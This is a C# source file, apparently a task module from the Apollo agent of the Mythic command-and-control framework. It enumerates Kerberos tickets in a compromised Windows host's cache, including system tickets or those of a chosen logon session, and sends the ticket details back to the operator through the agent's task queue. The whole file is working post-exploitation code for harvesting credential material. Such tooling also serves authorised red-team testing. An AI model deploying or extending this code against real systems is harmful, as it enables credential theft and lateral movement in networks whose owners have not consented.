#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_CACHE_LIST
#endif

#if TICKET_CACHE_LIST

using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Features.KerberosTickets;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;

namespace Tasks;

public class ticket_cache_list : Tasking
{
    [DataContract]
    internal struct TicketListParameters
    {
        [DataMember(Name = "getSystemTickets")]
        internal bool? getSystemTickets;
        [DataMember(Name = "luid")]
        internal string? luid;
    }

    public ticket_cache_list(IAgent agent, MythicTask data) : base(agent, data)
    { }
    
    
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        TicketListParameters parameters = _jsonSerializer.Deserialize<TicketListParameters>(_data.Parameters);
        string luid = parameters.luid ?? "";
        bool getSystemTickets = parameters.getSystemTickets ?? false;
        try
        {
            var tickets = _agent.GetTicketManager().EnumerateTicketsInCache(getSystemTickets, luid);
            StringBuilder ticketStringOutput = new StringBuilder();
            for(int i = 0; i < tickets.Count; i++)
            {
                ticketStringOutput.AppendLine($"Ticket # {i}:");
                ticketStringOutput.Append(KerberosTicketInfoDTO.CreateFromKerberosTicket(tickets[i]).ToString().ToIndentedString());
                ticketStringOutput.Append("\n");
            }
            resp = CreateTaskResponse($"Enumerated Tickets \n {ticketStringOutput}", true);
        }
        catch (Exception e)
        {
            resp = CreateTaskResponse($"Failed to enumerate tickets: {e.Message}",true, "error");
        }
        //get and send back any artifacts
        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
        var artifactResp = CreateArtifactTaskResponse(artifacts);
        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);

        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}

#endif